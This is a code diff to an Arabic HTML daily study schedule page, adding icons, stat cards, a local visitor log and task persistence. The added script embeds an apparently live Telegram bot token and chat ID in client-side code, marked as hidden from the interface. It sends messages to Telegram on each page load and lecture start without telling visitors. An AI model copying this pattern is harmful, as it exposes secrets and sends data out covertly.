@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>الجدول اليومي مع تتبع الوقت</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -39,6 +40,20 @@
             color: #ffcc00;
             text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
             margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        h1 i {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
         }
         
         .date-info {
@@ -55,6 +70,9 @@
         
         .date-info div {
             margin: 5px 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         
         .highlight {
@@ -162,6 +180,10 @@
             margin-bottom: 20px;
             text-align: center;
             font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
         
         .task-list {
@@ -181,6 +203,8 @@
             border: 1px solid #444;
             transition: all 0.3s ease;
             box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
         }
         
         .task-item:hover {
@@ -198,6 +222,10 @@
             font-size: 1.2rem;
             margin-bottom: 10px;
             color: #ffcc00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
         .completion-btn {
@@ -211,6 +239,10 @@
             transition: all 0.3s ease;
             width: 100%;
             font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
         .completion-btn:hover {
@@ -253,12 +285,18 @@
             border-radius: 15px;
             width: 0%;
             transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            font-weight: bold;
         }
         
         .progress-text {
             color: #ffcc00;
             font-size: 1.2rem;
             font-weight: bold;
+            margin-top: 10px;
         }
         
         footer {
@@ -276,6 +314,215 @@
             border-radius: 5px;
             padding: 3px 8px;
             display: inline-block;
+        }
+        
+        .stats-container {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .stat-card {
+            background: rgba(40, 40, 40, 0.9);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            min-width: 150px;
+            border: 1px solid #444;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ffcc00;
+            margin: 10px 0;
+        }
+        
+        .stat-label {
+            color: #aaa;
+        }
+        
+        .current-activity-highlight {
+            animation: highlight 2s infinite;
+        }
+        
+        @keyframes highlight {
+            0% { background-color: rgba(255, 204, 0, 0.2); }
+            50% { background-color: rgba(255, 204, 0, 0.4); }
+            100% { background-color: rgba(255, 204, 0, 0.2); }
+        }
+        
+        /* نافذة الزوار */
+        .visitors-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(25, 25, 25, 0.95);
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            padding: 20px;
+            width: 90%;
+            max-width: 600px;
+            z-index: 1000;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
+            display: none;
+        }
+        
+        .visitors-modal h2 {
+            color: #ffcc00;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .visitors-list {
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        
+        .visitor-item {
+            background: rgba(40, 40, 40, 0.9);
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+        }
+        
+        .visitor-item:nth-child(odd) {
+            background: rgba(50, 50, 50, 0.9);
+        }
+        
+        .visitor-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .visitor-date {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+        
+        .close-modal {
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            display: block;
+            margin: 0 auto;
+        }
+        
+        .close-modal:hover {
+            background: #ff9900;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            display: none;
+        }
+        
+        .visitors-btn {
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            display: block;
+            margin: 20px auto;
+        }
+        
+        .visitors-btn:hover {
+            background: #ff9900;
+        }
+        
+        /* تنبيهات */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 204, 0, 0.9);
+            color: #000;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            z-index: 1001;
+            display: none;
+            max-width: 300px;
+            border: 2px solid #ff9900;
+        }
+        
+        .notification.show {
+            display: block;
+            animation: slideIn 0.5s, fadeOut 0.5s 2.5s forwards;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+        
+        /* رسالة البداية */
+        .start-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(25, 25, 25, 0.95);
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            z-index: 1002;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
+            display: none;
+        }
+        
+        .start-message h2 {
+            color: #ffcc00;
+            margin-bottom: 20px;
+        }
+        
+        .start-message p {
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        
+        .close-start {
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        
+        .close-start:hover {
+            background: #ff9900;
         }
         
         @media (max-width: 768px) {
@@ -299,13 +546,18 @@
             .task-item {
                 max-width: 100%;
             }
+            
+            .stats-container {
+                flex-direction: column;
+                align-items: center;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>📅 الجدول اليومي الكامل</h1>
+            <h1><i class="fas fa-calendar-alt"></i> الجدول اليومي الكامل</h1>
             <div class="time-progress-container">
                 <div class="time-progress-bar" id="time-progress-bar"></div>
                 <div class="current-marker" id="current-marker"></div>
@@ -313,10 +565,33 @@
         </header>
         
         <div class="date-info">
-            <div>اليوم: <span class="highlight" id="current-day">الاثنين</span></div>
-            <div>التاريخ: <span class="highlight" id="current-date">21 سبتمبر 2023</span></div>
-            <div>الوقت الحالي: <span class="highlight" id="current-time">06:00 صباحاً</span></div>
-            <div>النشاط الحالي: <span class="highlight highlight-box" id="current-activity">محاضرة 1</span></div>
+            <div><i class="fas fa-calendar-day"></i> اليوم: <span class="highlight" id="current-day">الاثنين</span></div>
+            <div><i class="fas fa-calendar"></i> التاريخ: <span class="highlight" id="current-date">21 سبتمبر 2023</span></div>
+            <div><i class="fas fa-clock"></i> الوقت الحالي: <span class="highlight" id="current-time">06:00 صباحاً</span></div>
+            <div><i class="fas fa-tasks"></i> النشاط الحالي: <span class="highlight highlight-box" id="current-activity">محاضرة 1</span></div>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-label">الأنشطة المكتملة</div>
+                <div class="stat-value" id="completed-activities">0</div>
+                <div class="stat-label">من 11</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">الوقت المنقضي</div>
+                <div class="stat-value" id="time-elapsed">0%</div>
+                <div class="stat-label">من اليوم</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">الإنتاجية</div>
+                <div class="stat-value" id="productivity">0%</div>
+                <div class="stat-label">مستوى</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">عدد الزوار</div>
+                <div class="stat-value" id="visitor-count">0</div>
+                <div class="stat-label">إجمالي</div>
+            </div>
         </div>
         
         <div class="schedule-container">
@@ -377,53 +652,277 @@
         </div>
         
         <div class="tasks">
-            <h2>متابعة الإنجاز</h2>
+            <h2><i class="fas fa-check-circle"></i> متابعة الإنجاز</h2>
             <div class="task-list">
                 <div class="task-item" id="task-1">
-                    <div class="task-title">محاضرة 1</div>
-                    <button class="completion-btn" data-task="1">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 1</div>
+                    <button class="completion-btn" data-task="1"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-2">
-                    <div class="task-title">محاضرة 2</div>
-                    <button class="completion-btn" data-task="2">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 2</div>
+                    <button class="completion-btn" data-task="2"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-3">
-                    <div class="task-title">محاضرة 3</div>
-                    <button class="completion-btn" data-task="3">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 3</div>
+                    <button class="completion-btn" data-task="3"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-4">
-                    <div class="task-title">محاضرة 4</div>
-                    <button class="completion-btn" data-task="4">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 4</div>
+                    <button class="completion-btn" data-task="4"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-5">
-                    <div class="task-title">محاضرة 5</div>
-                    <button class="completion-btn" data-task="5">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 5</div>
+                    <button class="completion-btn" data-task="5"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-6">
-                    <div class="task-title">محاضرة 6</div>
-                    <button class="completion-btn" data-task="6">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 6</div>
+                    <button class="completion-btn" data-task="6"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
                 <div class="task-item" id="task-7">
-                    <div class="task-title">محاضرة 7</div>
-                    <button class="completion-btn" data-task="7">غير مكتمل</button>
+                    <div class="task-title"><i class="fas fa-book"></i> محاضرة 7</div>
+                    <button class="completion-btn" data-task="7"><i class="far fa-square"></i> غير مكتمل</button>
                 </div>
             </div>
         </div>
         
         <div class="progress-container">
-            <h2>تقدم اليوم</h2>
+            <h2><i class="fas fa-chart-line"></i> تقدم اليوم</h2>
             <div class="progress-bar">
-                <div class="progress-fill" id="progress-fill"></div>
+                <div class="progress-fill" id="progress-fill">0%</div>
             </div>
             <div class="progress-text" id="progress-text">0% مكتمل</div>
         </div>
         
+        <button class="visitors-btn" id="show-visitors"><i class="fas fa-users"></i> عرض سجل الزوار</button>
+        
         <footer>
             <p>© 2023 الجدول اليومي - جميع الحقوق محفوظة</p>
+            <p>صمم لمساعدتك على تحقيق أقصى إنتاجية في يومك الدراسي</p>
         </footer>
+    </div>
+    
+    <!-- نافذة عرض الزوار -->
+    <div class="overlay" id="overlay"></div>
+    <div class="visitors-modal" id="visitors-modal">
+        <h2><i class="fas fa-users"></i> سجل الزوار</h2>
+        <div class="visitors-list" id="visitors-list">
+            <!-- سيتم إضافة الزوار هنا ديناميكيًا -->
+        </div>
+        <button class="close-modal" id="close-modal">إغلاق</button>
+    </div>
+    
+    <!-- تنبيهات -->
+    <div class="notification" id="notification">
+        <div id="notification-content"></div>
+    </div>
+    
+    <!-- رسالة البداية -->
+    <div class="start-message" id="start-message">
+        <h2><i class="fas fa-robot"></i> البوت يعمل بنجاح!</h2>
+        <p>سيتم إرسال الشعار تلقائيًا عند بدء المحاضرات</p>
+        <p>ستتلقى إشعارًا في الوقت المناسب</p>
+        <button class="close-start" id="close-start">إغلاق</button>
     </div>
 
     <script>
+        // إعدادات البوت مُكوّنة مسبقًا (مخفي من الواجهة)
+        const BOT_TOKEN = "8184539085:AAGcjrR7V2E9hWvpepDWWTtmUeMbU-ANDEw";
+        const CHAT_ID = "5473321196";
+        
+        // دالة لتوليد معرف فريد للمستخدم
+        function generateUserId() {
+            return 'user_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
+        }
+        
+        // دالة للحصول على معرف المستخدم الحالي أو إنشاء واحد جديد
+        function getCurrentUserId() {
+            let userId = localStorage.getItem('userId');
+            if (!userId) {
+                userId = generateUserId();
+                localStorage.setItem('userId', userId);
+            }
+            return userId;
+        }
+        
+        // دالة لتسجيل زيارة جديدة
+        function logVisit() {
+            const userId = getCurrentUserId();
+            const now = new Date();
+            const visitData = {
+                id: userId,
+                timestamp: now.toISOString(),
+                date: now.toLocaleDateString('ar-EG'),
+                time: now.toLocaleTimeString('ar-EG', {hour: '2-digit', minute:'2-digit'})
+            };
+            
+            // الحصول على الزوار الحاليين
+            let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            
+            // التحقق مما إذا كان المستخدم الحالي قد زار اليوم
+            const today = new Date().toDateString();
+            const userVisitedToday = visitors.some(visitor => 
+                visitor.id === userId && new Date(visitor.timestamp).toDateString() === today
+            );
+            
+            // إذا لم يكن المستخدم قد زار اليوم، نضيف زيارته
+            if (!userVisitedToday) {
+                visitors.push(visitData);
+                localStorage.setItem('visitors', JSON.stringify(visitors));
+            }
+            
+            // تحديث عدد الزوار
+            updateVisitorCount();
+        }
+        
+        // دالة لتحديث عدد الزوار
+        function updateVisitorCount() {
+            const visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            document.getElementById('visitor-count').textContent = visitors.length;
+        }
+        
+        // دالة لعرض سجل الزوار
+        function showVisitors() {
+            const visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+            const visitorsList = document.getElementById('visitors-list');
+            
+            // ترتيب الزوار من الأحدث إلى الأقدم
+            visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            visitorsList.innerHTML = '';
+            
+            if (visitors.length === 0) {
+                visitorsList.innerHTML = '<p style="text-align:center;color:#aaa;">لا توجد زيارات مسجلة</p>';
+                return;
+            }
+            
+            visitors.forEach(visitor => {
+                const visitorElement = document.createElement('div');
+                visitorElement.className = 'visitor-item';
+                visitorElement.innerHTML = `
+                    <div class="visitor-info">
+                        <span><i class="fas fa-user"></i> ${visitor.id}</span>
+                        <span class="visitor-date">${visitor.date} - ${visitor.time}</span>
+                    </div>
+                `;
+                visitorsList.appendChild(visitorElement);
+            });
+            
+            document.getElementById('visitors-modal').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+        
+        // دالة لإغلاق نافذة الزوار
+        function closeVisitors() {
+            document.getElementById('visitors-modal').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+        
+        // دالة لإظهار تنبيه
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            const notificationContent = document.getElementById('notification-content');
+            
+            notificationContent.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // دالة لإظهار رسالة البداية
+        function showStartMessage() {
+            document.getElementById('start-message').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+        
+        // دالة لإغلاق رسالة البداية
+        function closeStartMessage() {
+            document.getElementById('start-message').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+        
+        // دالة لإرسال رسالة عبر البوت (مخفي من الواجهة)
+        async function sendBotMessage(message) {
+            try {
+                // إرسال الرسالة إلى البوت
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('تم إرسال الرسالة بنجاح');
+                    return true;
+                } else {
+                    console.error('فشل إرسال الرسالة:', response.statusText);
+                    return false;
+                }
+            } catch (error) {
+                console.error('خطأ في إرسال الرسالة:', error);
+                return false;
+            }
+        }
+        
+        // دالة لإرسال الشعار التلقائي
+        async function sendAutoLogo(activityName) {
+            const logoMessage = `
+🎓 *بدأ نشاط جديد* 🎓
+
+📅 اليوم: ${document.getElementById('current-day').textContent}
+🗓️ التاريخ: ${document.getElementById('current-date').textContent}
+⏰ الوقت الحالي: ${document.getElementById('current-time').textContent}
+🎯 النشاط الحالي: ${activityName}
+
+📊 *إحصائياتك اليومية*:
+✅ الأنشطة المكتملة: ${document.getElementById('completed-activities').textContent}/11
+⏱️ الوقت المنقضي: ${document.getElementById('time-elapsed').textContent}
+📈 الإنتاجية: ${document.getElementById('productivity').textContent}
+👥 عدد الزوار: ${document.getElementById('visitor-count').textContent}
+
+✨ استمر في تحقيق إنجازاتك!`;
+            
+            await sendBotMessage(logoMessage);
+        }
+        
+        // دالة لإرسال رسالة /start
+        async function sendStartMessage() {
+            const startMessage = `
+🤖 *البوت يعمل بنجاح!* 🤖
+
+سيتم إرسال الشعار تلقائيًا عند بدء المحاضرات
+ستتلقى إشعارًا في الوقت المناسب
+
+📊 *إحصائياتك الحالية*:
+✅ الأنشطة المكتملة: ${document.getElementById('completed-activities').textContent}/11
+⏱️ الوقت المنقضي: ${document.getElementById('time-elapsed').textContent}
+📈 الإنتاجية: ${document.getElementById('productivity').textContent}
+👥 عدد الزوار: ${document.getElementById('visitor-count').textContent}
+
+📅 *جدول اليوم*:
+⏰ 6:00 - 7:00: محاضرة 1
+⏰ 7:00 - 8:00: محاضرة 2
+⏰ 8:00 - 9:00: استراحة / رياضة / تسبح
+⏰ 9:00 - 10:00: محاضرة 3
+⏰ 10:00 - 11:00: محاضرة 4
+⏰ 11:00 - 12:00: كتابة ملخص سريع
+⏰ 12:00 - 14:00: 🌿 غداء + صلاة + راحة
+⏰ 14:00 - 15:00: محاضرة 5
+⏰ 15:00 - 16:00: محاضرة 6
+⏰ 16:00 - 17:00: محاضرة 7 (إذا عندك طاقة)
+⏰ 17:00 - 18:00: كتابة ملخص + مراجعة
+
+✨ استمر في تحقيق إنجازاتك!`;
+            
+            await sendBotMessage(startMessage);
+        }
+        
         // تحديث التاريخ والوقت
         function updateDateTime() {
             const now = new Date();
@@ -443,6 +942,38 @@
             
             // تحديث شريط التقدم الزمني
             updateTimeProgress();
+            
+            // التحقق من مواعيد المحاضرات
+            checkLectureTimes(now);
+        }
+        
+        // التحقق من مواعيد المحاضرات وإرسال الشعار تلقائيًا
+        function checkLectureTimes(now) {
+            const activities = [
+                { start: 6*60, end: 7*60, name: "محاضرة 1", id: "activity-1" },
+                { start: 7*60, end: 8*60, name: "محاضرة 2", id: "activity-2" },
+                { start: 8*60, end: 9*60, name: "استراحة / رياضة / تسبح", id: "activity-3" },
+                { start: 9*60, end: 10*60, name: "محاضرة 3", id: "activity-4" },
+                { start: 10*60, end: 11*60, name: "محاضرة 4", id: "activity-5" },
+                { start: 11*60, end: 12*60, name: "كتابة ملخص سريع", id: "activity-6" },
+                { start: 12*60, end: 14*60, name: "🌿 غداء + صلاة + راحة", id: "activity-7" },
+                { start: 14*60, end: 15*60, name: "محاضرة 5", id: "activity-8" },
+                { start: 15*60, end: 16*60, name: "محاضرة 6", id: "activity-9" },
+                { start: 16*60, end: 17*60, name: "محاضرة 7 (إذا عندك طاقة)", id: "activity-10" },
+                { start: 17*60, end: 18*60, name: "كتابة ملخص + مراجعة", id: "activity-11" }
+            ];
+            
+            const currentMinutes = now.getHours() * 60 + now.getMinutes();
+            
+            // التحقق من مواعيد المحاضرات
+            activities.forEach(activity => {
+                // إذا بدأ النشاط الآن (في أول دقيقة)
+                if (currentMinutes === activity.start) {
+                    showNotification(`⏰ حان وقت ${activity.name}!`);
+                    // إرسال الشعار تلقائيًا
+                    sendAutoLogo(activity.name);
+                }
+            });
         }
         
         // تحديث شريط التقدم الزمني
@@ -461,9 +992,11 @@
             if (progress > 100) progress = 100;
             
             document.getElementById('time-progress-bar').style.width = `${progress}%`;
+            document.getElementById('time-elapsed').textContent = `${Math.round(progress)}%`;
             
             // تحديث النشاط الحالي
             updateCurrentActivity(now);
+            updateStats();
         }
         
         // تحديث النشاط الحالي
@@ -488,8 +1021,7 @@
             activities.forEach(activity => {
                 const element = document.getElementById(activity.id);
                 if (element) {
-                    element.style.backgroundColor = '';
-                    element.style.fontWeight = 'normal';
+                    element.classList.remove('current-activity-highlight');
                 }
             });
             
@@ -500,8 +1032,7 @@
                     currentActivity = activity.name;
                     const element = document.getElementById(activity.id);
                     if (element) {
-                        element.style.backgroundColor = 'rgba(255, 204, 0, 0.2)';
-                        element.style.fontWeight = 'bold';
+                        element.classList.add('current-activity-highlight');
                     }
                     break;
                 }
@@ -517,15 +1048,59 @@
             
             if (completed) {
                 taskItem.classList.add('completed');
-                button.textContent = 'مكتمل ✓';
+                button.innerHTML = '<i class="fas fa-check-square"></i> مكتمل ✓';
                 button.classList.add('completed');
             } else {
                 taskItem.classList.remove('completed');
-                button.textContent = 'غير مكتمل';
+                button.innerHTML = '<i class="far fa-square"></i> غير مكتمل';
                 button.classList.remove('completed');
             }
             
             updateProgress();
+            updateStats();
+            
+            // حفظ حالة المهام في localStorage
+            saveTaskStatus();
+        }
+        
+        // حفظ حالة المهام
+        function saveTaskStatus() {
+            const tasks = {};
+            document.querySelectorAll('.completion-btn').forEach(button => {
+                const taskNumber = button.getAttribute('data-task');
+                tasks[taskNumber] = button.classList.contains('completed');
+            });
+            localStorage.setItem('taskStatus', JSON.stringify(tasks));
+        }
+        
+        // استعادة حالة المهام
+        function restoreTaskStatus() {
+            const savedTasks = JSON.parse(localStorage.getItem('taskStatus') || '{}');
+            for (const [taskNumber, isCompleted] of Object.entries(savedTasks)) {
+                updateTaskStatus(taskNumber, isCompleted);
+            }
+        }
+        
+        // إعادة تعيين المهام في الساعة 1 صباحاً
+        function resetTasksAt1AM() {
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
+            
+            // إذا كانت الساعة 1 صباحاً (أو الساعة 13 ظهراً إذا كنت تستخدم نظام 24 ساعة)
+            if (hours === 1 && minutes === 0) {
+                // إعادة تعيين حالة المهام
+                localStorage.removeItem('taskStatus');
+                
+                // إعادة تعيين أزرار المهام
+                document.querySelectorAll('.completion-btn').forEach(button => {
+                    const taskNumber = button.getAttribute('data-task');
+                    updateTaskStatus(taskNumber, false);
+                });
+                
+                showNotification('🔄 تم إعادة تعيين المهام لليوم الجديد');
+                sendBotMessage('🔄 تم إعادة تعيين المهام لليوم الجديد');
+            }
         }
         
         // حساب التقدم
@@ -541,7 +1116,27 @@
             
             const progress = Math.round((completedCount / buttons.length) * 100);
             document.getElementById('progress-fill').style.width = `${progress}%`;
+            document.getElementById('progress-fill').textContent = `${progress}%`;
             document.getElementById('progress-text').textContent = `${progress}% مكتمل`;
+        }
+        
+        // تحديث الإحصائيات
+        function updateStats() {
+            const buttons = document.querySelectorAll('.completion-btn');
+            let completedCount = 0;
+            
+            buttons.forEach(button => {
+                if (button.classList.contains('completed')) {
+                    completedCount++;
+                }
+            });
+            
+            document.getElementById('completed-activities').textContent = completedCount;
+            
+            // حساب الإنتاجية (نسبة الأنشطة المكتملة إلى الوقت المنقضي)
+            const timeProgress = parseInt(document.getElementById('time-elapsed').textContent);
+            const productivity = timeProgress > 0 ? Math.round((completedCount / 7) * 100) : 0;
+            document.getElementById('productivity').textContent = `${productivity}%`;
         }
         
         // إضافة مستمعي الأحداث للأزرار
@@ -553,10 +1148,46 @@
             });
         });
         
+        // مستمعي أحداث نافذة الزوار
+        document.getElementById('show-visitors').addEventListener('click', showVisitors);
+        document.getElementById('close-modal').addEventListener('click', closeVisitors);
+        document.getElementById('overlay').addEventListener('click', closeVisitors);
+        
+        // مستمعي أحداث رسالة البداية
+        document.getElementById('close-start').addEventListener('click', closeStartMessage);
+        
+        // عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            // تسجيل الزيارة
+            logVisit();
+            
+            // استعادة حالة المهام
+            restoreTaskStatus();
+            
+            // تحديث الوقت وال إحصائيات
+            updateDateTime();
+            updateProgress();
+            updateStats();
+            
+            // التحقق من أمر /start في عنوان URL
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('start')) {
+                sendStartMessage();
+                showStartMessage();
+            }
+            
+            // إرسال رسالة ترحيبية عند تحميل الصفحة لأول مرة
+            sendBotMessage("✅ تم تشغيل الجدول اليومي بنجاح! سيتم إرسال الإشعارات تلقائيًا عند بدء المحاضرات.");
+        });
+        
         // تحديث الوقت كل دقيقة
-        setInterval(updateDateTime, 60000);
+        setInterval(() => {
+            updateDateTime();
+            resetTasksAt1AM();
+        }, 60000);
+        
+        // تحديث فوري عند تحميل الصفحة
         updateDateTime();
-        updateProgress();
     </script>
 </body>
 </html>
